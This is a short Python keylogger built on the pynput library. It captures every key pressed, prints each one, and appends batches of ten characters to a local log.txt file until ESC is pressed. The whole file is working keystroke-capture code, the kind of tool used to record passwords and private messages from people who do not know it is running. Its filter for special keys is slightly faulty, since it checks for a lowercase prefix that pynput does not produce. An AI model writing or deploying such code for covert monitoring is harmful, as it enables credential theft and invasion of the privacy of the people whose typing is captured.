import pynput

from pynput.keyboard import Key, Listener

# Initialize variables
key_count = 0
pressed_keys = []

def on_press(key):
    """Handle key press event"""
    global key_count, pressed_keys

    pressed_keys.append(key)
    key_count += 1
    print(f"{key} pressed")

    if key_count >= 10:
        key_count = 0
        write_to_file(pressed_keys)
        pressed_keys = []

def write_to_file(keys):
    """Write keys to log file"""
    with open("log.txt", "a") as file:
        for key in keys:
            key_str = str(key).replace("'", "")
            if "space" in key_str:
                file.write("\n")
            elif not key_str.startswith("key"):
                file.write(key_str)

def on_release(key):
    """Handle key release event"""
    if key == Key.esc:
        # Stop listener on ESC key press
        return False

# Create and start keyboard listener
listener = Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()
